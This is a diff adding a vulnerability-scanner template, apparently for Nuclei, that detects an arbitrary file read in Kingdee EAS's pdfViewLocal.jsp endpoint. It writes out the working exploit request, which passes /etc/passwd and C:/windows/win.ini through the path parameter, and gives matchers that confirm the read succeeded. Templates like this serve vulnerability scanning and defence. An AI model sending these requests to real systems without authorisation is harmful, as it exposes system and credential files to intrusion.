@@ -1,0 +1,47 @@
+id: kingdee-eas-pdfviewlocal-file-read
+
+info:
+  name: Kingdee EAS pdfviewlocal.jsp Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: Kingdee EAS pdfViewLocal.jsp endpoint allows reading arbitrary files via the path parameter, including system files like /etc/passwd and C:/windows/win.ini.
+  reference:
+    - https://github.com/nu0l/poc-wiki
+  classification:
+    cwe-id: CWE-22
+  metadata:
+    max-request: 2
+  tags: kingdee,file-read,lfi
+
+variables:
+  file:
+    - C:/windows/win.ini
+    - /etc/passwd
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/plt_document/fragments/content/pdfViewLocal.jsp?path={{file}}"
+
+    payloads:
+      file:
+        - C:/windows/win.ini
+        - /etc/passwd
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/pdf"
+
+      - type: dsl
+        dsl:
+          - |
+            contains(body, "[file]") && contains(body, "; for 16-bit app support") && !contains(body, "<")
+          - |
+            contains(body, "root:") && contains(body, "/bin") && !contains(body, "<")
